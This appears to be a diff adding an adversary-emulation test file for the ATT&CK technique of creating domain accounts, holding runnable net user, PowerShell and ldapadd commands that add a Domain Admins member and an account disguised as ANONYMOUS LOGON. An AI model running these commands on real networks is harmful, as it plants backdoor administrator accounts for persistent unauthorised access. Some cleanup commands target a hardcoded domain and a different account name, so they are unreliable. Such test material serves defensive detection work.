@@ -1,0 +1,184 @@
+attack_technique: T1136.002
+display_name: 'Create Account: Domain Account'
+atomic_tests:
+- name: Create a new Windows domain admin user
+  auto_generated_guid: fcec2963-9951-4173-9bfa-98d8b7834e62
+  description: |
+    Creates a new domain admin user in a command prompt.
+  supported_platforms:
+  - windows
+  input_arguments:
+    username:
+      description: Username of the user to create
+      type: string
+      default: T1136.002_Admin
+    password:
+      description: Password of the user to create
+      type: string
+      default: T1136_pass123!
+    group:
+      description: Domain administrator group to which add the user to
+      type: string
+      default: Domain Admins
+  executor:
+    command: |
+      net user "#{username}" "#{password}" /add /domain
+      net group "#{group}" "#{username}" /add /domain
+    cleanup_command: |
+      net user "#{username}" >nul 2>&1 /del /domain
+    name: command_prompt
+    elevation_required: false  # Requires a user to be a Domain Admin!
+- name: Create a new account similar to ANONYMOUS LOGON
+  auto_generated_guid: dc7726d2-8ccb-4cc6-af22-0d5afb53a548
+  description: |
+    Create a new account similar to ANONYMOUS LOGON in a command prompt.
+  supported_platforms:
+  - windows
+  input_arguments:
+    username:
+      description: Username of the user to create
+      type: string
+      default: ANONYMOUS  LOGON
+    password:
+      description: Password of the user to create
+      type: string
+      default: T1136_pass123!
+  executor:
+    command: |
+      net user "#{username}" "#{password}" /add /domain
+    cleanup_command: |
+      net user "#{username}" >nul 2>&1 /del /domain
+    name: command_prompt
+    elevation_required: false  # Requires a user to be a Domain Admin!
+- name: Create a new Domain Account using PowerShell
+  auto_generated_guid: 5a3497a4-1568-4663-b12a-d4a5ed70c7d7
+  description: |
+    Creates a new Domain User using the credentials of the Current User
+  supported_platforms:
+  - windows
+  input_arguments:
+    username:
+      description: "Name of the Account to be created"
+      type: string
+      default: T1136.002_Admin
+    password:
+      description: "Password of the Account to be created"
+      type: string
+      default: T1136_pass123!
+  executor:
+    command: |
+      $SamAccountName = '#{username}'
+      $AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force
+      Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+      $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
+      $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
+      $User.SamAccountName = $SamAccountName
+      $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
+      $User.SetPassword($TempCred.GetNetworkCredential().Password)
+      $User.Enabled = $True
+      $User.PasswordNotRequired = $False
+      $User.DisplayName = $SamAccountName
+      $User.Save()
+      $User
+    cleanup_command: |
+      cmd /c "net user #{username} /del >nul 2>&1"
+    name: powershell
+    elevation_required: false  # Requires a user to be a Domain Admin!
+- name: Active Directory Create Admin Account
+  auto_generated_guid: 562aa072-524e-459a-ba2b-91f1afccf5ab
+  description: |
+    Use Admin Credentials to Create A Domain Admin Account
+  supported_platforms:
+  - linux
+  input_arguments:
+    domain:
+      description: The domain to be tested
+      type: string
+      default: example
+    top_level_domain:
+      description: The top level domain (.com, .test, .remote, etc... following domain, minus the .)
+      type: string
+      default: test
+    admin_user:
+      description: username@domain of a user with admin privileges
+      type: string
+      default: admin@example.test
+    admin_password:
+      description: password of the user with admin privileges referenced in admin_user
+      type: string
+      default: s3CurePssw0rD!
+    domain_controller:
+      description: Name of the domain_controller machine, defined in etc/hosts
+      type: string
+      default: adVM
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      Packages sssd-ad sssd-tools realmd adcli installed and realm available
+    prereq_command: |
+      which ldapadd && which ldapmodify
+    get_prereq_command: |
+      echo ldapadd or ldapmodify not found; exit 1
+  executor:
+    elevation_required: false
+    command: |
+       echo "dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}" > tempadmin.ldif
+       echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
+       ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
+    cleanup_command: |
+       echo removing Atomic User (temporary user)
+       echo "dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\nchangetype: delete" > deleteuser.ldif
+       ldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif
+       rm deleteuser.ldif
+       rm tempadmin.ldif
+    name: sh
+- name: Active Directory Create User Account (Non-elevated)
+  auto_generated_guid: 8c992cb3-a46e-4fd5-b005-b1bab185af31
+  description: |
+    Use Admin Credentials to Create A Normal Account (as means of entry)
+  supported_platforms:
+  - linux
+  input_arguments:
+    domain:
+      description: The domain to be tested
+      type: string
+      default: example
+    top_level_domain:
+      description: The top level domain (.com, .test, .remote, etc... following domain, minus the .)
+      type: string
+      default: test
+    admin_user:
+      description: username@domain of a user with admin privileges
+      type: string
+      default: user@example.test
+    admin_password:
+      description: password of the user
+      type: string
+      default: s3CurePssw0rD!
+    domain_controller:
+      description: Name of the domain_controller machine, defined in etc/hosts
+      type: string
+      default: adVM
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapadd, ldapmodify
+    prereq_command: |
+      which ldapadd
+      which ldapmodify
+    get_prereq_command: |
+      echo ldapadd or ldapmodify not found; exit 1
+  executor:
+    elevation_required: false
+    command: |
+       echo "dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\nobjectClass: person\ncn: Atomic User\nsn: User" > tempadmin.ldif
+       echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
+       ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
+    cleanup_command: |
+       echo removing Atomic User (temporary user)
+       echo "dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\nchangetype: delete" > deleteuser.ldif
+       ldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif
+       rm deleteuser.ldif
+       rm tempadmin.ldif
+    name: sh
+
